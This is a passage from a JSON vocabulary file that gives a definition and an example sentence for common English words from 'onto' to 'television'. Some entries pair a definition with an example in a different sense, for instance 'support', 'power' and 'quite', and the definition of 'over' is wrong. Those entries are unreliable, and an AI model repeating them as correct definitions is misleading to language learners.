        "definition": "moving to a location on (the surface of something)",
        "example": "She climbed onto the roof to get a better view."
    },
    "open": {
        "definition": "allowing access, passage, or a view through an empty space; not closed or blocked",
        "example": "She left the door open."
    },
    "operation": {
        "definition": "an act of surgery performed on a patient",
        "example": "The patient underwent a successful operation."
    },
    "opportunity": {
        "definition": "a set of circumstances that makes it possible to do something",
        "example": "She seized the opportunity to travel abroad."
    },
    "option": {
        "definition": "a thing that is or may be chosen",
        "example": "They had the option to either take the bus or walk."
    },
    "or": {
        "definition": "used to link alternatives",
        "example": "Would you like tea or coffee?"
    },
    "order": {
        "definition": "the arrangement or disposition of people or things in relation to each other according to a particular sequence, pattern, or method",
        "example": "The books are arranged in alphabetical order."
    },
    "organization": {
        "definition": "an organized body of people with a particular purpose, especially a business, society, association, etc.",
        "example": "She works for a non-profit organization."
    },
    "other": {
        "definition": "used to refer to a person or thing that is different or distinct from one already mentioned or known",
        "example": "The other students were already seated."
    },
    "others": {
        "definition": "plural form of other",
        "example": "Some students prefer to study alone, while others prefer group study."
    },
    "our": {
        "definition": "belonging to or associated with the speaker and one or more other people previously mentioned or easily identified",
        "example": "This is our house."
    },
    "out": {
        "definition": "moving or appearing to move away from a particular place, especially one that is enclosed or hidden",
        "example": "She went out to the garden."
    },
    "outside": {
        "definition": "situated or moving beyond the boundaries or confines of",
        "example": "They played outside in the yard."
    },
    "over": {
        "definition": "extending directly upward from",
        "example": "The cat jumped over the fence."
    },
    "own": {
        "definition": "possess (something) as one's own; have",
        "example": "They own a beautiful house."
    },
    "owner": {
        "definition": "a person who owns something",
        "example": "She is the owner of the bookstore."
    },
    "page": {
        "definition": "one or both sides of a sheet of paper in a book, magazine, newspaper, or other collection of bound sheets",
        "example": "She read the first page of the book."
    },
    "pain": {
        "definition": "physical suffering or discomfort caused by illness or injury",
        "example": "He felt a sharp pain in his leg."
    },
    "painting": {
        "definition": "the process or art of using paint, in a picture, as a protective coating, or as decoration",
        "example": "The gallery exhibited a beautiful painting."
    },
    "paper": {
        "definition": "material manufactured in thin sheets from the pulp of wood or other fibrous substances, used for writing, drawing, or printing on, or as wrapping material",
        "example": "She wrote a letter on a piece of paper."
    },
    "parent": {
        "definition": "a father or mother",
        "example": "Her parents are very supportive."
    },
    "part": {
        "definition": "an amount or section which, when combined with others, makes up the whole of something",
        "example": "She read the first part of the story."
    },
    "participant": {
        "definition": "a person who takes part in something",
        "example": "Every participant in the race received a medal."
    },
    "particular": {
        "definition": "used to single out an individual member of a specified group or class",
        "example": "She paid attention to one particular detail."
    },
    "particularly": {
        "definition": "to a higher degree than is usual or average",
        "example": "She was particularly interested in the history of the region."
    },
    "partner": {
        "definition": "either of a pair of people engaged together in the same activity",
        "example": "He is my business partner."
    },
    "party": {
        "definition": "a social gathering of invited guests, typically involving eating, drinking, and entertainment",
        "example": "They had a birthday party for their friend."
    },
    "pass": {
        "definition": "move or cause to move in a specified direction",
        "example": "She decided to pass the ball to her teammate."
    },
    "past": {
        "definition": "gone by in time and no longer existing",
        "example": "She spoke about events in her past."
    },
    "patient": {
        "definition": "able to accept or tolerate delays, problems, or suffering without becoming annoyed or anxious",
        "example": "She remained patient while waiting for her turn."
    },
    "pattern": {
        "definition": "a repeated decorative design",
        "example": "The fabric had a beautiful floral pattern."
    },
    "pay": {
        "definition": "give (someone) money that is due for work done, goods received, or a debt incurred",
        "example": "He needs to pay the bills."
    },
    "peace": {
        "definition": "freedom from disturbance; tranquility",
        "example": "She enjoys the peace and quiet of the countryside."
    },
    "people": {
        "definition": "human beings in general or considered collectively",
        "example": "Many people attended the concert."
    },
    "per": {
        "definition": "for each (used with units to express a rate)",
        "example": "The car can travel 30 miles per gallon."
    },
    "perform": {
        "definition": "carry out, accomplish, or fulfill (an action, task, or function)",
        "example": "She will perform a song at the talent show."
    },
    "performance": {
        "definition": "an act of staging or presenting a play, concert, or other form of entertainment",
        "example": "The play had an outstanding performance."
    },
    "perhaps": {
        "definition": "used to express uncertainty or possibility",
        "example": "Perhaps it will rain tomorrow."
    },
    "period": {
        "definition": "a length or portion of time",
        "example": "She studied for a long period."
    },
    "person": {
        "definition": "a human being regarded as an individual",
        "example": "He is a very kind person."
    },
    "personal": {
        "definition": "belonging to or affecting a particular person rather than anyone else",
        "example": "She shared her personal story."
    },
    "phone": {
        "definition": "a telephone",
        "example": "She called her friend on the phone."
    },
    "physical": {
        "definition": "relating to the body as opposed to the mind",
        "example": "Regular exercise is good for physical health."
    },
    "pick": {
        "definition": "take hold of and remove (a flower, fruit, or vegetable) from where it is growing",
        "example": "She likes to pick fresh berries."
    },
    "picture": {
        "definition": "a painting or drawing",
        "example": "She took a picture of the sunset."
    },
    "piece": {
        "definition": "a portion of an object or of material, produced by cutting, tearing, or breaking the whole",
        "example": "He gave her a piece of cake."
    },
    "place": {
        "definition": "a particular position or point in space",
        "example": "They found a place to sit in the park."
    },
    "plan": {
        "definition": "a detailed proposal for doing or achieving something",
        "example": "She made a plan for the weekend."
    },
    "plant": {
        "definition": "a living organism of the kind exemplified by trees, shrubs, herbs, grasses, ferns, and mosses, typically growing in a permanent site, absorbing water and inorganic substances through its roots, and synthesizing nutrients in its leaves by photosynthesis using the green pigment chlorophyll",
        "example": "She decided to plant flowers in the garden."
    },
    "play": {
        "definition": "engage in activity for enjoyment and recreation rather than a serious or practical purpose",
        "example": "The children like to play outside."
    },
    "player": {
        "definition": "a person taking part in a sport or game",
        "example": "He is a skilled basketball player."
    },
    "PM": {
        "definition": "afternoon and evening",
        "example": "The meeting is scheduled for 3 PM."
    },
    "point": {
        "definition": "a particular spot, place, or position in an area or on a map, object, or surface",
        "example": "She made a valid point during the discussion."
    },
    "police": {
        "definition": "the civil force of a national or local government, responsible for the prevention and detection of crime and the maintenance of public order",
        "example": "The police responded quickly to the emergency."
    },
    "policy": {
        "definition": "a course or principle of action adopted or proposed by an organization or individual",
        "example": "The company has a strict no-smoking policy."
    },
    "political": {
        "definition": "relating to the government or the public affairs of a country",
        "example": "She is interested in political science."
    },
    "politics": {
        "definition": "the activities associated with the governance of a country or area, especially the debate between parties having power",
        "example": "They discussed politics over dinner."
    },
    "poor": {
        "definition": "lacking sufficient money to live at a standard considered comfortable or normal in a society",
        "example": "The charity helps poor families."
    },
    "popular": {
        "definition": "liked or admired by many people or by a particular person or group",
        "example": "She is a popular student in her school."
    },
    "population": {
        "definition": "all the inhabitants of a particular town, area, or country",
        "example": "The population of the city is growing rapidly."
    },
    "position": {
        "definition": "a place where someone or something is located or has been put",
        "example": "She found a comfortable position to read her book."
    },
    "positive": {
        "definition": "consisting in or characterized by the presence or possession of features or qualities rather than their absence",
        "example": "She has a positive attitude towards life."
    },
    "possible": {
        "definition": "able to be done or achieved",
        "example": "It is possible to finish the project on time."
    },
    "power": {
        "definition": "the ability or capacity to do something or act in a particular way",
        "example": "The wind turbine generates power for the town."
    },
    "practice": {
        "definition": "the actual application or use of an idea, belief, or method, as opposed to theories about such application or use",
        "example": "She needs more practice to improve her skills."
    },
    "prepare": {
        "definition": "make (something) ready for use or consideration",
        "example": "She took time to prepare for her presentation."
    },
    "present": {
        "definition": "existing or occurring now",
        "example": "She is happy with her present situation."
    },
    "president": {
        "definition": "the elected head of a republican state",
        "example": "The president gave a speech to the nation."
    },
    "pressure": {
        "definition": "the continuous physical force exerted on or against an object by something in contact with it",
        "example": "She felt a lot of pressure to perform well."
    },
    "pretty": {
        "definition": "attractive in a delicate way without being truly beautiful or handsome",
        "example": "She wore a pretty dress to the party."
    },
    "prevent": {
        "definition": "keep (something) from happening or arising",
        "example": "Proper hygiene can prevent the spread of illness."
    },
    "price": {
        "definition": "the amount of money expected, required, or given in payment for something",
        "example": "The price of the book was quite reasonable."
    },
    "private": {
        "definition": "belonging to or for the use of one particular person or group of people only",
        "example": "She has a private office."
    },
    "probably": {
        "definition": "almost certainly; as far as one knows or can tell",
        "example": "She will probably attend the meeting."
    },
    "problem": {
        "definition": "a matter or situation regarded as unwelcome or harmful and needing to be dealt with and overcome",
        "example": "She solved the problem quickly."
    },
    "process": {
        "definition": "a series of actions or steps taken in order to achieve a particular end",
        "example": "The process of applying for a visa can be complicated."
    },
    "produce": {
        "definition": "make or manufacture from components or raw materials",
        "example": "The factory produces high-quality goods."
    },
    "product": {
        "definition": "an article or substance that is manufactured or refined for sale",
        "example": "The company launched a new product."
    },
    "production": {
        "definition": "the action of making or manufacturing from components or raw materials, or the process of being so manufactured",
        "example": "The production of the movie took two years."
    },
    "professional": {
        "definition": "relating to or connected with a profession",
        "example": "She received professional training for the job."
    },
    "professor": {
        "definition": "a teacher of the highest rank in a college or university",
        "example": "The professor gave an interesting lecture."
    },
    "program": {
        "definition": "a planned series of future events or performances",
        "example": "The conference includes a program of keynote speeches."
    },
    "project": {
        "definition": "an individual or collaborative enterprise that is carefully planned and designed to achieve a particular aim",
        "example": "She is working on a new project at work."
    },
    "property": {
        "definition": "a thing or things belonging to someone; possessions collectively",
        "example": "They own a lot of property in the city."
    },
    "protect": {
        "definition": "keep safe from harm or injury",
        "example": "She wore a helmet to protect her head."
    },
    "prove": {
        "definition": "demonstrate the truth or existence of (something) by evidence or argument",
        "example": "He had to prove his point with facts."
    },
    "provide": {
        "definition": "make available for use; supply",
        "example": "The company provides health insurance to its employees."
    },
    "public": {
        "definition": "of or concerning the people as a whole",
        "example": "The park is open to the public."
    },
    "pull": {
        "definition": "exert force on (someone or something) so as to cause movement toward oneself",
        "example": "She had to pull the door to open it."
    },
    "purpose": {
        "definition": "the reason for which something is done or created or for which something exists",
        "example": "The purpose of the meeting is to discuss the new project."
    },
    "push": {
        "definition": "exert force on (someone or something) in order to move them away from oneself",
        "example": "She had to push the door to close it."
    },
    "put": {
        "definition": "move to or place in a particular position",
        "example": "She put the book on the shelf."
    },
    "quality": {
        "definition": "the standard of something as measured against other things of a similar kind; the degree of excellence of something",
        "example": "The quality of the product is excellent."
    },
    "question": {
        "definition": "a sentence worded or expressed so as to elicit information",
        "example": "She asked a difficult question."
    },
    "quickly": {
        "definition": "at a fast speed; rapidly",
        "example": "She finished her homework quickly."
    },
    "quite": {
        "definition": "to the utmost or most absolute extent or degree; absolutely; completely",
        "example": "The movie was quite interesting."
    },
    "race": {
        "definition": "a competition between runners, horses, vehicles, boats, etc., to see which is the fastest in covering a set course",
        "example": "She participated in a marathon race."
    },
    "radio": {
        "definition": "the transmission and reception of electromagnetic waves of radio frequency, especially those carrying sound messages",
        "example": "She listens to the radio every morning."
    },
    "raise": {
        "definition": "lift or move to a higher position or level",
        "example": "She raised her hand to ask a question."
    },
    "range": {
        "definition": "the area of variation between upper and lower limits on a particular scale",
        "example": "The store offers a wide range of products."
    },
    "rate": {
        "definition": "a measure, quantity, or frequency, typically one measured against some other quantity or measure",
        "example": "The interest rate for the loan is high."
    },
    "rather": {
        "definition": "used to indicate one's preference in a particular matter",
        "example": "She would rather stay home than go out."
    },
    "reach": {
        "definition": "stretch out an arm in a specified direction in order to touch or grasp something",
        "example": "He had to reach up to get the book from the top shelf."
    },
    "read": {
        "definition": "look at and comprehend the meaning of (written or printed matter) by mentally interpreting the characters or symbols of which it is composed",
        "example": "She likes to read books."
    },
    "ready": {
        "definition": "in a suitable state for an activity, action, or situation; fully prepared",
        "example": "She is ready to start the project."
    },
    "real": {
        "definition": "actually existing as a thing or occurring in fact; not imagined or supposed",
        "example": "The story is based on real events."
    },
    "reality": {
        "definition": "the state of things as they actually exist, as opposed to an idealistic or notional idea of them",
        "example": "She had to face the reality of the situation."
    },
    "realize": {
        "definition": "become fully aware of (something) as a fact; understand clearly",
        "example": "She didn't realize how late it was."
    },
    "really": {
        "definition": "in actual fact, as opposed to what is said or imagined to be true or possible",
        "example": "She really enjoys her job."
    },
    "reason": {
        "definition": "a cause, explanation, or justification for an action or event",
        "example": "She gave a valid reason for her absence."
    },
    "receive": {
        "definition": "be given, presented with, or paid (something)",
        "example": "She received a gift from her friend."
    },
    "recent": {
        "definition": "having happened, begun, or been done not long ago; belonging to a past period comparatively close to the present",
        "example": "She shared her recent travels with her friends."
    },
    "recently": {
        "definition": "at a recent time; not long ago",
        "example": "He recently moved to a new city."
    },
    "recognize": {
        "definition": "identify (someone or something) from having encountered them before; know again",
        "example": "She didn't recognize him at first."
    },
    "record": {
        "definition": "a thing constituting a piece of evidence about the past, especially an account kept in writing or some other permanent form",
        "example": "She kept a record of her expenses."
    },
    "red": {
        "definition": "of a color at the end of the spectrum next to orange and opposite violet, as of blood, fire, or rubies",
        "example": "She wore a red dress to the party."
    },
    "reduce": {
        "definition": "make smaller or less in amount, degree, or size",
        "example": "They aim to reduce waste by recycling."
    },
    "reflect": {
        "definition": "think deeply or carefully about",
        "example": "She took a moment to reflect on her achievements."
    },
    "region": {
        "definition": "an area, especially part of a country or the world having definable characteristics but not always fixed boundaries",
        "example": "They explored the mountainous region."
    },
    "relate": {
        "definition": "make or show a connection between",
        "example": "She could relate to his experiences."
    },
    "relationship": {
        "definition": "the way in which two or more concepts, objects, or people are connected, or the state of being connected",
        "example": "They have a close relationship."
    },
    "religious": {
        "definition": "relating to or believing in a religion",
        "example": "He is deeply religious and attends church regularly."
    },
    "remain": {
        "definition": "continue to exist, especially after other similar or related people or things have ceased to exist",
        "example": "Only a few ruins remain of the ancient city."
    },
    "remember": {
        "definition": "have in or be able to bring to one's mind an awareness of (someone or something from the past)",
        "example": "She can still remember her first day of school."
    },
    "remove": {
        "definition": "take (something) away or off from the position occupied",
        "example": "He decided to remove the old wallpaper."
    },
    "report": {
        "definition": "give a spoken or written account of something that one has observed, heard, done, or investigated",
        "example": "She wrote a report on the company's performance."
    },
    "represent": {
        "definition": "be entitled or appointed to act or speak for (someone), especially in an official capacity",
        "example": "The lawyer will represent the client in court."
    },
    "Republican": {
        "definition": "a member or supporter of the Republican Party in the United States",
        "example": "He is a registered Republican."
    },
    "require": {
        "definition": "need for a particular purpose",
        "example": "The project will require additional resources."
    },
    "research": {
        "definition": "the systematic investigation into and study of materials and sources in order to establish facts and reach new conclusions",
        "example": "She is conducting research on climate change."
    },
    "resource": {
        "definition": "a stock or supply of money, materials, staff, and other assets that can be drawn on by a person or organization in order to function effectively",
        "example": "They allocated more resources to the new project."
    },
    "respond": {
        "definition": "say something in reply",
        "example": "She didn't know how to respond to his question."
    },
    "response": {
        "definition": "a verbal or written answer",
        "example": "She received a quick response to her email."
    },
    "responsibility": {
        "definition": "the state or fact of having a duty to deal with something or of having control over someone",
        "example": "He takes his responsibilities seriously."
    },
    "rest": {
        "definition": "cease work or movement in order to relax, refresh oneself, or recover strength",
        "example": "She decided to rest after a long day."
    },
    "result": {
        "definition": "a consequence, effect, or outcome of something",
        "example": "The experiment yielded positive results."
    },
    "return": {
        "definition": "come or go back to a place or person",
        "example": "She decided to return the book to the library."
    },
    "reveal": {
        "definition": "make (previously unknown or secret information) known to others",
        "example": "She revealed the surprise party plans to her friend."
    },
    "rich": {
        "definition": "having a great deal of money or assets; wealthy",
        "example": "They live in a rich neighborhood."
    },
    "right": {
        "definition": "morally good, justified, or acceptable",
        "example": "She always tries to do the right thing."
    },
    "rise": {
        "definition": "move from a lower position to a higher one; come or go up",
        "example": "The sun will rise early in the morning."
    },
    "risk": {
        "definition": "a situation involving exposure to danger",
        "example": "She decided to take a risk and start her own business."
    },
    "road": {
        "definition": "a wide way leading from one place to another, especially one with a specially prepared surface which vehicles can use",
        "example": "They traveled down the winding road."
    },
    "rock": {
        "definition": "the solid mineral material forming part of the surface of the earth and other similar planets, exposed on the surface or underlying the soil or oceans",
        "example": "The children collected colorful rocks by the river."
    },
    "role": {
        "definition": "the function assumed or part played by a person or thing in a particular situation",
        "example": "He played the role of a hero in the movie."
    },
    "room": {
        "definition": "space that can be occupied or where something can be done",
        "example": "She redecorated her living room."
    },
    "rule": {
        "definition": "one of a set of explicit or understood regulations or principles governing conduct within a particular activity or sphere",
        "example": "The game has specific rules that must be followed."
    },
    "run": {
        "definition": "move at a speed faster than a walk, never having both or all the feet on the ground at the same time",
        "example": "She likes to run in the park every morning."
    },
    "safe": {
        "definition": "protected from or not exposed to danger or risk; not likely to be harmed or lost",
        "example": "The children are safe in the playground."
    },
    "same": {
        "definition": "identical; not different",
        "example": "They wore the same dress to the party."
    },
    "save": {
        "definition": "keep safe or rescue (someone or something) from harm or danger",
        "example": "She decided to save money for a vacation."
    },
    "say": {
        "definition": "utter words so as to convey information, an opinion, a feeling or intention, or an instruction",
        "example": "What did you say to her?"
    },
    "scene": {
        "definition": "the place where an incident in real life or fiction occurs or occurred",
        "example": "The movie's final scene was very emotional."
    },
    "school": {
        "definition": "an institution for educating children",
        "example": "They go to the same school."
    },
    "science": {
        "definition": "the intellectual and practical activity encompassing the systematic study of the structure and behavior of the physical and natural world through observation and experiment",
        "example": "She is fascinated by the wonders of science."
    },
    "scientist": {
        "definition": "a person who is studying or has expert knowledge of one or more of the natural or physical sciences",
        "example": "The scientist conducted experiments in the lab."
    },
    "score": {
        "definition": "the number of points, goals, runs, etc., achieved in a game or by a team or an individual",
        "example": "He was happy with his high score on the test."
    },
    "sea": {
        "definition": "the expanse of salt water that covers most of the earth's surface and surrounds its landmasses",
        "example": "They spent the day sailing on the sea."
    },
    "season": {
        "definition": "each of the four divisions of the year (spring, summer, autumn, and winter) marked by particular weather patterns and daylight hours, resulting from the earth's changing position with regard to the sun",
        "example": "Autumn is her favorite season."
    },
    "seat": {
        "definition": "a thing made or used for sitting on, such as a chair or stool",
        "example": "She found a comfortable seat in the theater."
    },
    "second": {
        "definition": "constituting number two in a sequence; coming after the first in time or order",
        "example": "She came in second place in the race."
    },
    "section": {
        "definition": "any of the more or less distinct parts into which something is or may be divided or from which it is made up",
        "example": "They explored a new section of the park."
    },
    "security": {
        "definition": "the state of being free from danger or threat",
        "example": "The building has tight security."
    },
    "see": {
        "definition": "perceive with the eyes; discern visually",
        "example": "She can see the mountains from her window."
    },
    "seek": {
        "definition": "attempt to find (something)",
        "example": "They seek advice from their mentors."
    },
    "seem": {
        "definition": "give the impression or sensation of being something or having a particular quality",
        "example": "It seems like a good idea."
    },
    "sell": {
        "definition": "give or hand over (something) in exchange for money",
        "example": "She decided to sell her old car."
    },
    "send": {
        "definition": "cause to go or be taken to a particular destination; arrange for the delivery of, especially by mail",
        "example": "He decided to send a letter to his friend."
    },
    "senior": {
        "definition": "of or for older or more experienced people",
        "example": "She is a senior member of the team."
    },
    "sense": {
        "definition": "a faculty by which the body perceives an external stimulus; one of the faculties of sight, smell, hearing, taste, and touch",
        "example": "She has a keen sense of smell."
    },
    "series": {
        "definition": "a number of things, events, or people of a similar kind or related nature coming one after another",
        "example": "She watched a new TV series on Netflix."
    },
    "serious": {
        "definition": "demanding or characterized by careful consideration or application",
        "example": "The situation is very serious and requires immediate attention."
    },
    "serve": {
        "definition": "perform duties or services for (another person or an organization)",
        "example": "She decided to serve in the local community center."
    },
    "service": {
        "definition": "the action of helping or doing work for someone",
        "example": "The restaurant provides excellent service."
    },
    "set": {
        "definition": "put, lay, or stand (something) in a specified place or position",
        "example": "She decided to set the table for dinner."
    },
    "seven": {
        "definition": "equivalent to the sum of three and four; one more than six, or three less than ten; 7",
        "example": "She bought seven apples from the market."
    },
    "several": {
        "definition": "more than two but not many",
        "example": "They visited several places during their trip."
    },
    "shake": {
        "definition": "move (an object) up and down or from side to side with rapid, forceful, jerky movements",
        "example": "She decided to shake the bottle before opening it."
    },
    "share": {
        "definition": "have a portion of (something) with another or others",
        "example": "They decided to share their lunch."
    },
    "she": {
        "definition": "used to refer to a woman, girl, or female animal previously mentioned or easily identified",
        "example": "She is my best friend."
    },
    "shoot": {
        "definition": "kill or wound (a person or animal) with a bullet or arrow",
        "example": "The hunter decided to shoot the deer."
    },
    "short": {
        "definition": "measuring a small distance from end to end",
        "example": "She wore a short dress to the party."
    },
    "shot": {
        "definition": "the act of discharging a firearm or releasing an arrow",
        "example": "He took a shot at the target."
    },
    "should": {
        "definition": "used to indicate obligation, duty, or correctness, typically when criticizing someone's actions",
        "example": "You should finish your homework before playing."
    },
    "shoulder": {
        "definition": "the upper joint of each of a person's arms and the part of the body between this and the neck",
        "example": "She felt a pain in her shoulder."
    },
    "show": {
        "definition": "be, allow, or cause to be visible",
        "example": "She decided to show him the new book she bought."
    },
    "side": {
        "definition": "a position to the left or right of an object, place, or central point",
        "example": "They walked along the side of the road."
    },
    "sign": {
        "definition": "an object, quality, or event whose presence or occurrence indicates the probable presence or occurrence of something else",
        "example": "She saw a sign that said 'No Parking'."
    },
    "significant": {
        "definition": "sufficiently great or important to be worthy of attention; noteworthy",
        "example": "The discovery was significant for the research community."
    },
    "similar": {
        "definition": "resembling without being identical",
        "example": "The two paintings are very similar."
    },
    "simple": {
        "definition": "easily understood or done; presenting no difficulty",
        "example": "The instructions were simple and easy to follow."
    },
    "since": {
        "definition": "from a time in the past until the time under consideration, typically the present",
        "example": "She has been studying since morning."
    },
    "sing": {
        "definition": "make musical sounds with the voice, especially words with a set tune",
        "example": "She loves to sing in the shower."
    },
    "single": {
        "definition": "only one; not one of several",
        "example": "He ordered a single slice of pizza."
    },
    "sister": {
        "definition": "a woman or girl in relation to other daughters and sons of her parents",
        "example": "She has an older sister."
    },
    "sit": {
        "definition": "adopt or be in a position in which one's weight is supported by one's buttocks rather than one's feet and one's back is upright",
        "example": "She decided to sit on the bench."
    },
    "site": {
        "definition": "an area of ground on which a town, building, or monument is constructed",
        "example": "The construction site was busy with workers."
    },
    "situation": {
        "definition": "a set of circumstances in which one finds oneself; a state of affairs",
        "example": "She handled the situation calmly."
    },
    "six": {
        "definition": "equivalent to the product of two and three; one more than five, or four less than ten; 6",
        "example": "There are six chairs around the table."
    },
    "size": {
        "definition": "the relative extent of something; a thing's overall dimensions or magnitude; how big something is",
        "example": "She was surprised by the size of the gift."
    },
    "skill": {
        "definition": "the ability to do something well; expertise",
        "example": "She has a lot of skill in painting."
    },
    "skin": {
        "definition": "the thin layer of tissue forming the natural outer covering of the body of a person or animal",
        "example": "He has very sensitive skin."
    },
    "small": {
        "definition": "of a size that is less than normal or usual",
        "example": "She lives in a small apartment."
    },
    "smile": {
        "definition": "form one's features into a pleased, kind, or amused expression, typically with the corners of the mouth turned up and the front teeth exposed",
        "example": "She greeted him with a smile."
    },
    "social": {
        "definition": "relating to society or its organization",
        "example": "He enjoys social gatherings."
    },
    "society": {
        "definition": "the aggregate of people living together in a more or less ordered community",
        "example": "Society plays a crucial role in shaping an individual's behavior."
    },
    "soldier": {
        "definition": "a person who serves in an army",
        "example": "The soldier received a medal for bravery."
    },
    "some": {
        "definition": "an unspecified amount or number of",
        "example": "She bought some groceries."
    },
    "somebody": {
        "definition": "an unspecified or unknown person",
        "example": "Somebody left their umbrella in the hall."
    },
    "someone": {
        "definition": "an unknown or unspecified person; some person",
        "example": "Someone called while you were out."
    },
    "something": {
        "definition": "a thing that is unspecified or unknown",
        "example": "She heard something moving in the bushes."
    },
    "sometimes": {
        "definition": "occasionally, rather than all of the time",
        "example": "Sometimes she goes for a walk in the evening."
    },
    "son": {
        "definition": "a boy or man in relation to either or both of his parents",
        "example": "Her son is in college."
    },
    "song": {
        "definition": "a short poem or other set of words set to music or meant to be sung",
        "example": "She wrote a beautiful song."
    },
    "soon": {
        "definition": "in or after a short time",
        "example": "She will be here soon."
    },
    "sort": {
        "definition": "a category of things or people having some common feature; a type",
        "example": "She likes this sort of music."
    },
    "sound": {
        "definition": "vibrations that travel through the air or another medium and can be heard when they reach a person's or animal's ear",
        "example": "She loves the sound of rain."
    },
    "source": {
        "definition": "a place, person, or thing from which something comes or can be obtained",
        "example": "The river is the main source of water for the village."
    },
    "south": {
        "definition": "the direction toward the point of the horizon 90\u00b0 clockwise from east, or the point on the horizon itself",
        "example": "They traveled to the south of the country."
    },
    "southern": {
        "definition": "situated in the south or directed toward or facing the south",
        "example": "They visited the southern part of the island."
    },
    "space": {
        "definition": "a continuous area or expanse which is free, available, or unoccupied",
        "example": "She found a parking space near the entrance."
    },
    "speak": {
        "definition": "say something in order to convey information, an opinion, or a feeling",
        "example": "She decided to speak up during the meeting."
    },
    "special": {
        "definition": "better, greater, or otherwise different from what is usual",
        "example": "She made a special effort to attend the event."
    },
    "specific": {
        "definition": "clearly defined or identified",
        "example": "She gave specific instructions for the task."
    },
    "speech": {
        "definition": "the expression of or the ability to express thoughts and feelings by articulate sounds",
        "example": "He gave an inspiring speech at the ceremony."
    },
    "spend": {
        "definition": "pay out (money) in buying or hiring goods or services",
        "example": "She decided to spend her savings on a new car."
    },
    "sport": {
        "definition": "an activity involving physical exertion and skill in which an individual or team competes against another or others for entertainment",
        "example": "She enjoys playing team sports."
    },
    "spring": {
        "definition": "the season after winter and before summer, in which vegetation begins to appear, in the northern hemisphere from March to May and in the southern hemisphere from September to November",
        "example": "Spring is her favorite season."
    },
    "staff": {
        "definition": "all the people employed by a particular organization",
        "example": "The hospital staff are very dedicated."
    },
    "stage": {
        "definition": "a point, period, or step in a process or development",
        "example": "They are in the final stage of the project."
    },
    "stand": {
        "definition": "have or maintain an upright position, supported by one's feet",
        "example": "She decided to stand by the window."
    },
    "standard": {
        "definition": "a level of quality or attainment",
        "example": "The product meets the industry standard."
    },
    "star": {
        "definition": "a fixed luminous point in the night sky which is a large, remote incandescent body like the sun",
        "example": "The stars twinkled in the clear night sky."
    },
    "start": {
        "definition": "begin or be reckoned from a particular point in time or space",
        "example": "They decided to start the meeting at 9 AM."
    },
    "state": {
        "definition": "the particular condition that someone or something is in at a specific time",
        "example": "The state of the economy is improving."
    },
    "statement": {
        "definition": "a definite or clear expression of something in speech or writing",
        "example": "She made a bold statement during the debate."
    },
    "station": {
        "definition": "a regular stopping place on a public transportation route, especially one on a railroad line with a platform and often one or more buildings",
        "example": "They waited at the train station."
    },
    "stay": {
        "definition": "remain in the same place",
        "example": "She decided to stay at home."
    },
    "step": {
        "definition": "an act or movement of putting one leg in front of the other in walking or running",
        "example": "She took a step forward."
    },
    "still": {
        "definition": "not moving or making a sound",
        "example": "The room was very still and quiet."
    },
    "stock": {
        "definition": "the goods or merchandise kept on the premises of a business or warehouse and available for sale or distribution",
        "example": "The store has a wide stock of books."
    },
    "stop": {
        "definition": "cause (an action, process, or event) to come to an end",
        "example": "She decided to stop the car at the red light."
    },
    "store": {
        "definition": "a retail establishment selling items to the public",
        "example": "They went to the store to buy groceries."
    },
    "story": {
        "definition": "an account of imaginary or real people and events told for entertainment",
        "example": "She wrote a short story for her class."
    },
    "strategy": {
        "definition": "a plan of action or policy designed to achieve a major or overall aim",
        "example": "They discussed the marketing strategy."
    },
    "street": {
        "definition": "a public road in a city or town, typically with houses and buildings on one or both sides",
        "example": "They walked down the busy street."
    },
    "strong": {
        "definition": "having the power to move heavy weights or perform other physically demanding tasks",
        "example": "He is very strong and can lift heavy objects."
    },
    "structure": {
        "definition": "the arrangement of and relations between the parts or elements of something complex",
        "example": "The structure of the organization is hierarchical."
    },
    "student": {
        "definition": "a person who is studying at a school or college",
        "example": "She is a diligent student."
    },
    "study": {
        "definition": "the devotion of time and attention to acquiring knowledge on an academic subject, especially by means of books",
        "example": "She decided to study for her exams."
    },
    "stuff": {
        "definition": "matter, material, articles, or activities of a specified or indeterminate kind that are being referred to, indicated, or implied",
        "example": "She packed her stuff for the trip."
    },
    "style": {
        "definition": "a manner of doing something",
        "example": "Her style of writing is very unique."
    },
    "subject": {
        "definition": "a person or thing that is being discussed, described, or dealt with",
        "example": "She changed the subject during the conversation."
    },
    "success": {
        "definition": "the accomplishment of an aim or purpose",
        "example": "She achieved great success in her career."
    },
    "successful": {
        "definition": "accomplishing an aim or purpose",
        "example": "The project was successful."
    },
    "such": {
        "definition": "of the type previously mentioned",
        "example": "He had never seen such a beautiful sunset."
    },
    "suddenly": {
        "definition": "quickly and unexpectedly",
        "example": "The weather changed suddenly."
    },
    "suffer": {
        "definition": "experience or be subjected to (something bad or unpleasant)",
        "example": "She had to suffer through a difficult situation."
    },
    "suggest": {
        "definition": "put forward for consideration",
        "example": "She decided to suggest a new idea."
    },
    "summer": {
        "definition": "the warmest season of the year, in the northern hemisphere from June to August and in the southern hemisphere from December to February",
        "example": "They love going to the beach in summer."
    },
    "support": {
        "definition": "bear all or part of the weight of; hold up",
        "example": "She provided emotional support to her friend."
    },
    "sure": {
        "definition": "confident in what one thinks or knows; having no doubt that one is right",
        "example": "She was sure she had locked the door."
    },
    "surface": {
        "definition": "the outside part or uppermost layer of something (often used when describing its texture, form, or extent)",
        "example": "The surface of the table was smooth."
    },
    "system": {
        "definition": "a set of connected things or parts forming a complex whole, in particular",
        "example": "The solar system consists of eight planets."
    },
    "table": {
        "definition": "a piece of furniture with a flat top and one or more legs, providing a level surface on which objects may be placed",
        "example": "They sat around the table for dinner."
    },
    "take": {
        "definition": "lay hold of (something) with one's hands; reach for and hold",
        "example": "She decided to take the book from the shelf."
    },
    "talk": {
        "definition": "speak in order to give information or express ideas or feelings; converse or communicate by spoken words",
        "example": "They decided to talk about their plans."
    },
    "task": {
        "definition": "a piece of work to be done or undertaken",
        "example": "She completed the task on time."
    },
    "tax": {
        "definition": "a compulsory contribution to state revenue, levied by the government on workers' income and business profits, or added to the cost of some goods, services, and transactions",
        "example": "They paid their income tax."
    },
    "teach": {
        "definition": "show or explain to (someone) how to do something",
        "example": "She loves to teach mathematics to her students."
    },
    "teacher": {
        "definition": "a person who teaches, especially in a school",
        "example": "She is a dedicated teacher."
    },
    "team": {
        "definition": "a group of players forming one side in a competitive game or sport",
        "example": "They worked together as a team to win the game."
    },
    "technology": {
        "definition": "the application of scientific knowledge for practical purposes, especially in industry",
        "example": "Advancements in technology have changed the way we live."
    },
    "television": {
